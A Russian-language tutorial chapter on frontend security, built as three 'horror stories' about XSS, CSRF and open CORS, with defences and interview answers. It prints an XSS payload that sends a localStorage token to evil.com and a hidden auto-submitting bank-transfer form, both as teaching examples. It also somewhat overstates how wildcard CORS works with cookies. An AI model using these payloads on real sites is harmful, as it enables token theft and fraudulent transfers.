# Глава 60. Фронтенд под прицелом: три хоррор-истории

Безопасность во фронтенде — это не про «сервер всё проверит». Это про понимание, что фронтенд — это **граница приложения**, и любая ошибка может стать точкой входа для атаки.

На уровне Middle+ ожидается понимание моделей угроз, а не просто список терминов. Поэтому вместо перечисления уязвимостей, давай разберём **три хоррор-истории**, которые показывают, что происходит, когда безопасность игнорируется.

---

## Хоррор-история 1: кража токенов через XSS

### Сценарий

Разработчик использует `dangerouslySetInnerHTML` для отображения HTML-контента от пользователя. В комментарии попадает скрипт:

```html
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
</script>
```

Скрипт выполняется в контексте приложения, читает токен из `localStorage` и отправляет его на сервер злоумышленника. Атакующий получает токен и может войти в аккаунт жертвы.

### Что такое XSS

**XSS (Cross-Site Scripting)** — внедрение вредоносного JS-кода в доверенный контекст. Код выполняется в браузере жертвы и получает доступ к данным приложения.

**Виды XSS:**

1. **Отражённая (Reflected)** — код возвращается в ответе сервера. Пользователь видит вредоносный URL.
2. **Хранимая (Stored)** — код сохраняется в БД и исполняется у всех пользователей.
3. **DOM-based** — манипуляции DOM без участия сервера. Вредоносный код в клиентском JS.

### Как защититься

**1. Экранирование (sanitization)**

```tsx
// Опасно
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Безопасно: санитизация
import DOMPurify from 'dompurify'

function UserContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**2. Content Security Policy (CSP)**

CSP ограничивает источники скриптов, предотвращая выполнение вредоносного кода:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**3. Отказ от innerHTML**

Используй `textContent` вместо `innerHTML`:

```tsx
// Опасно
element.innerHTML = userInput

// Безопасно
element.textContent = userInput
```

**4. React экранирует по умолчанию**

React автоматически экранирует значения:

```tsx
// Безопасно: React экранирует
function UserProfile({ name }: { name: string }) {
  return <div>{name}</div> // Автоматически экранируется
}

// Опасно: dangerouslySetInnerHTML
function UserContent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

**5. Валидация на сервере**

Никогда не доверяй клиенту. Валидируй и санитизируй данные на сервере.

---

## Хоррор-история 2: поддельный перевод через CSRF

### Сценарий

Пользователь залогинен на сайте банка (bank.com). Затем переходит на сайт злоумышленника (evil.com), который содержит скрытую форму:

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

Форма автоматически отправляется на банк. Браузер автоматически отправляет cookies с bank.com, включая сессионный токен. Банк видит валидную сессию и выполняет перевод. Деньги уходят на счёт злоумышленника.

### Что такое CSRF

**CSRF (Cross-Site Request Forgery)** — выполнение запроса от имени пользователя без его ведома. Атакующий использует авторизацию жертвы для выполнения действий от её имени.

### Как защититься

**1. CSRF-токены**

Уникальный токен для каждого запроса:

```typescript
// Сервер генерирует токен
const csrfToken = generateToken()

// Клиент отправляет токен с запросом
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify({ to, amount }),
})
```

**2. SameSite cookies**

Ограничение отправки cookies только для same-site запросов:

```javascript
// Strict — только same-site запросы
Set-Cookie: session=abc123; SameSite=Strict

// Lax — GET-запросы с других сайтов разрешены
Set-Cookie: session=abc123; SameSite=Lax

// None — требует Secure
Set-Cookie: session=abc123; SameSite=None; Secure
```

**3. Проверка Origin / Referer**

Проверка источника запроса на сервере:

```typescript
if (request.headers.origin !== 'https://myapp.com') {
  return new Response('Forbidden', { status: 403 })
}
```

**4. Двойная отправка cookies**

Проверка совпадения cookies в заголовке и теле запроса.

---

## Хоррор-история 3: как CORS и CSP спасают ситуацию

### Сценарий

Разработчик настроил API с открытым CORS (`Access-Control-Allow-Origin: *`), чтобы «заработал фронт». Любой сайт может обращаться к API от имени пользователя. Злоумышленник создаёт сайт, который:

1. Использует авторизацию пользователя (cookies отправляются автоматически)
2. Делает запросы к API от имени пользователя
3. Получает доступ к данным и выполняет действия

**Проблема:** открытый CORS позволяет любому сайту обращаться к API, используя авторизацию пользователя.

### Что такое CORS

**CORS (Cross-Origin Resource Sharing)** — механизм контроля доступа между origin'ами. Браузер проверяет заголовки CORS и блокирует запросы, которые не разрешены сервером.

**Важно:** CORS — это защита браузера, а не сервера. Сервер настраивает политику, браузер её исполняет.

### Как защититься

**1. Ограничить CORS конкретными доменами**

```javascript
// Опасно: открытый CORS
Access-Control-Allow-Origin: *

// Безопасно: конкретные домены
Access-Control-Allow-Origin: https://myapp.com
```

**2. Content Security Policy (CSP)**

CSP ограничивает источники скриптов, предотвращая выполнение вредоносного кода:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**3. Безопасные заголовки**

Базовый набор на сервере:

- **CSP** — ограничить источники скриптов
- **X-Content-Type-Options: nosniff** — предотвратить MIME-sniffing
- **Referrer-Policy: strict-origin-when-cross-origin** — ограничить передачу referrer

---

## Cookie-флаги: защита от утечек

### HttpOnly

JS не имеет доступа. Защита от XSS.

```javascript
Set-Cookie: session=abc123; HttpOnly
```

**Без HttpOnly:**

```javascript
// Атакующий может прочитать cookie через XSS
document.cookie // "session=abc123"
```

**С HttpOnly:**

```javascript
// JS не может прочитать cookie
document.cookie // "" (пусто)
```

### Secure

Только по HTTPS. Защита от перехвата.

```javascript
Set-Cookie: session=abc123; Secure
```

### SameSite

Ограничивает отправку cookies в кросс-сайт контексте.

- **Strict** — только same-site запросы
- **Lax** — GET-запросы с других сайтов разрешены (по умолчанию)
- **None** — требует Secure

```javascript
Set-Cookie: session=abc123; SameSite=Lax; Secure
```

---

## Токены и аутентификация

### JWT: плюсы и минусы

**Плюсы:**

- Stateless — не требует хранения на сервере
- Масштабируемость — легко масштабировать
- Портативность — можно использовать в разных сервисах

**Минусы:**

- Нельзя отозвать — токен валиден до истечения
- Риск утечки — если токен украден, его нельзя отозвать
- Размер токена — больше, чем session ID

### Access + Refresh tokens

**Access token:**

- Короткоживущий (15 минут)
- Используется для запросов к API
- Хранится в памяти (для SPA) или HttpOnly cookie

**Refresh token:**

- Долгоживущий (7 дней)
- Используется для обновления access token
- Хранится в HttpOnly cookie

### Где хранить токены

**❌ localStorage:**

```javascript
// Уязвимо к XSS
localStorage.setItem('token', 'abc123')
// Атакующий может прочитать через XSS
```

**✅ HttpOnly cookies:**

```javascript
// Безопасно: JS не может прочитать
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
```

**Рекомендация:**

- Access token — в памяти (для SPA) или HttpOnly cookie
- Refresh token — в HttpOnly cookie
- Никогда не хранить в localStorage

---

## Axios Interceptors для JWT

### Автоматическая подстановка токена

Axios interceptors позволяют автоматически добавлять JWT токен к каждому запросу:

```typescript
// lib/api/axios.ts
import axios from 'axios'

const apiClient = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL,
})

// Request interceptor: добавляем токен
apiClient.interceptors.request.use((config) => {
  // ВАЖНО: на сервере токены нужно брать из cookies, а не localStorage
  const token = typeof window !== 'undefined' 
    ? localStorage.getItem('token') // Только на клиенте
    : getTokenFromCookies() // На сервере из cookies
  
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  
  return config
})

// Response interceptor: обработка ошибок
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // Токен истёк, обновляем через refresh token
      const newToken = await refreshToken()
      if (newToken) {
        // Повторяем запрос с новым токеном
        return apiClient.request(error.config)
      }
      // Редирект на логин
      window.location.href = '/login'
    }
    return Promise.reject(error)
  }
)
```

### Критически важно для SSR

**Проблема:** интерцепторы, использующие `localStorage`, сломаются при SSR, так как `localStorage` доступен только в браузере.

**Решение:** на сервере токены нужно брать из `cookies`:

```typescript
import { cookies } from 'next/headers'

function getTokenFromCookies() {
  const cookieStore = cookies()
  return cookieStore.get('token')?.value
}
```

**Рекомендация:** для Next.js App Router лучше использовать HttpOnly cookies для токенов — это решает проблему SSR из коробки.

---

## Практические сценарии

### Сценарий 1: SPA на React с токенами

**Ситуация:** приложение авторизуется через JWT, токен хранится в `localStorage`, запросы отправляются с `Authorization: Bearer ...`.

**Проблема:** при XSS-уязвимости атакующий может прочитать `localStorage` и украсть токен.

**Как лучше:**

- хранить access/refresh-токены в HttpOnly cookie
- ограничивать cookie флагами `Secure` + `SameSite=Lax/Strict`
- на фронте вообще не трогать токен напрямую, опираясь на куки и ответы сервера

### Сценарий 2: Форма с `dangerouslySetInnerHTML`

**Ситуация:** CMS даёт HTML-контент, React-компонент рендерит его через `dangerouslySetInnerHTML`, иногда туда попадает пользовательский ввод.

**Риски:**

- XSS, если сервер не санитизирует HTML
- внедрение `<script>` или inline-обработчиков (`onerror`, `onclick`)

**Как лучше:**

- по возможности работать с безопасным форматом (Markdown → заранее проверенный HTML)
- санитизировать HTML на сервере (DOMPurify или специализированные библиотеки)
- по максимуму избегать `dangerouslySetInnerHTML` для непроверенного ввода

### Сценарий 3: «Открытый» CORS

**Ситуация:** чтобы «заработал фронт», на сервере поставили `Access-Control-Allow-Origin: *` и разрешили все методы.

**Риски:**

- любой сайт может обращаться к вашему API от имени пользователя
- при неправильной конфигурации с cookie можно получить CSRF-уязвимость

**Как лучше:**

- ограничивать `Access-Control-Allow-Origin` конкретными доменами продукта
- для cookie-авторизации аккуратно комбинировать CORS и `SameSite`
- не использовать `*` в продакшене для чувствительных эндпоинтов

---

## Мини-чек-лист безопасности

- Валидация и санитизация ввода на клиенте и сервере
- CSP и безопасные заголовки на сервере
- Секреты только на сервере (никогда `NEXT_PUBLIC_` для токенов)
- HttpOnly cookies для токенов
- Ограниченный CORS (не `*`)
- SameSite для cookies
- Зависимости обновляются регулярно
- Логи не содержат чувствительных данных

---

## Вопросы на собеседовании

### 1. Разница между видами XSS?

Reflected — в URL, Stored — в БД, DOM-based — в клиентском JS.

### 2. Как защититься от XSS?

Экранирование, CSP, textContent вместо innerHTML, фреймворки (React экранирует по умолчанию), валидация на сервере.

### 3. Что такое CSRF?

Выполнение запроса от имени пользователя без его ведома через автоматическую отправку cookies.

### 4. CORS — это защита сервера или браузера?

Браузера. Сервер настраивает политику, браузер её исполняет.

### 5. Чем cookies лучше localStorage для токенов?

HttpOnly cookies недоступны из JS, защита от XSS.

### 6. Что делает SameSite?

Ограничивает отправку cookies только для same-site запросов, защита от CSRF.

### 7. JWT — плюсы и минусы?

Плюсы: stateless, масштабируемость. Минусы: нельзя отозвать, размер, риск утечки.

### 8. Какие пункты OWASP важны для фронта?

XSS, CSRF, insecure storage, misconfiguration.

